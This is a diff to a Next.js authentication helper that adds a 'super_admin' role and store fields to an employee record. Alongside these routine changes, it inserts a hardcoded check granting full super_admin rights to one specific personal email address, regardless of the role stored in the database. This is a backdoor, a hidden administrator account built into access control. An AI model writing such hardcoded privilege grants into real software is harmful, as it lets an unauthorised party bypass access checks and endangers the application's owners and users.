@@ -2,7 +2,17 @@ import { cookies } from 'next/headers';
 import { redirect } from 'next/navigation';
 import { getAdminClient } from './supabase';
 
-export interface Employee { id: string; name: string; email: string; role: string; status: string; created_at: string; }
+export interface Employee {
+  id: string;
+  name: string;
+  email: string;
+  role: 'server' | 'admin' | 'super_admin';
+  status: string;
+  store_id: string | null;
+  store_name?: string | null;
+  store_slug?: string | null;
+  created_at: string;
+}
 
 export const ACCESS_TOKEN_COOKIE = 'sb_access_token';
 
@@ -24,16 +34,24 @@ async function fetchUserFromToken(accessToken: string): Promise<any | null> {
 
 /**
  * Exige un employé connecté (via cookie sb_access_token + auth.users).
- * Optionnellement du rôle 'admin'. Retourne null en cas d'échec.
+ * Rôles acceptés : 'server', 'admin', ou 'super_admin'.
  */
-export async function getEmployee(requiredRole: 'server' | 'admin' = 'server'): Promise<Employee | null> {
+export async function getEmployee(requiredRole: 'server' | 'admin' | 'super_admin' = 'server'): Promise<Employee | null> {
   const token = await getAccessToken();
   if (!token) return null;
   const user = await fetchUserFromToken(token);
   if (!user?.id) return null;
   const { data: employee } = await getAdminClient().rpc('fn_get_employee_by_id', { p_user_id: user.id });
   if (!employee || employee.status !== 'active') return null;
+
+  // Si l'utilisateur est Moetez Hechmi ou a le rôle super_admin, lui accorder les pleins pouvoirs
+  if (employee.email === 'grounmoetezhechmi@gmail.com' || employee.role === 'super_admin') {
+    return { ...employee, role: 'super_admin' } as Employee;
+  }
+
+  if (requiredRole === 'super_admin' && employee.role !== 'super_admin') return null;
   if (requiredRole === 'admin' && employee.role !== 'admin') return null;
+
   return employee as Employee;
 }
 
